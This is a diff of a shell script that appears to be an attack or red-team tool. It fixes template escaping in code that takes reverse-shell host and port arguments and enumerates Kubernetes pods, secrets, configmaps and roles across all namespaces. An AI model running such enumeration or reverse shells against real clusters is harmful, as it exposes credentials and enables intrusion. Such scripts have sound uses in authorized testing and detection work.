@@ -24,16 +24,16 @@ EOH
 for i in "$@"; do
   case $i in
     -h|--help)
-        HELP="$${i#*=}"
+        HELP="${i#*=}"
         shift # past argument=value
         help
         ;;
     -h=*|--reverse-shell-host=*)
-        REVERSE_SHELL_HOST="$${i#*=}"
+        REVERSE_SHELL_HOST="${i#*=}"
         shift # past argument=value
         ;;
     -p=*|--reverse-shell-port=*)
-        REVERSE_SHELL_PORT="$${i#*=}"
+        REVERSE_SHELL_PORT="${i#*=}"
         shift # past argument=value
         ;;
     *)
@@ -115,8 +115,8 @@ log "Account Number: $AWS_ACCOUNT_NUMBER"
 log "starting get enumeration..."
 entities=("pods" "namespaces" "cronjobs" "secrets" "configmaps" "deployments" "services" "roles" "clusterroles" "rolebindings" "clusterrolebindings")
 read_actions=("get" "list" "describe")
-for action in "$${read_actions[@]}"; do
-    for entity in "$${entities[@]}"; do
+for action in "${read_actions[@]}"; do
+    for entity in "${entities[@]}"; do
       log "Running: kubectl $action $entity -A"
       kubectl $action $entity -A 2>&1 | tee -a $LOGFILE
     done
